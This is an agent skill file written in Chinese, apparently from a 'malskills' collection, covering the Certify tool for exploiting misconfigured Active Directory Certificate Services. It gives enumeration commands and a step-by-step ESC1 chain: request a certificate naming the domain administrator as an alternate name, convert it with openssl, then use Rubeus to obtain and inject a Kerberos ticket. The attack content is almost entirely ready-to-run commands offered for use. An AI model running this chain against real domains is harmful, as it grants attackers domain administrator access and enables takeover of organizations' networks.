---
name: "certify"
description: ">"
---

# Certify

*Sourced from killvxk-malskills-zh*

# Certify

AD CS 错误配置枚举与利用工具。

## 快速开始

```
Certify.exe find /vulnerable
Certify.exe find
Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnerableTemplate /altname:administrator
```

## 核心命令

| 命令 | 用途 |
|---------|---------|
| `find` | 枚举所有证书模板 |
| `find /vulnerable` | 显示 ESC1-ESC8 错误配置 |
| `find /enrolleeSuppliesSubject` | ESC1 候选项 |
| `request /ca: /template:` | 请求证书 |
| `request /altname:<user>` | ESC1 — 使用备用 UPN 请求 |
| `download /ca: /id:<n>` | 下载待处理的证书 |

## ESC1 完整攻击链

```
1. Certify.exe find /vulnerable
2. Certify.exe request /ca:CA\CA-NAME /template:Template /altname:domain\administrator
3. openssl pkcs12 -in cert.pem -keyex -export -out cert.pfx
4. Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pass /ptt
```

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | ESC2-ESC8 利用方法、certipy 跨平台替代方案 |

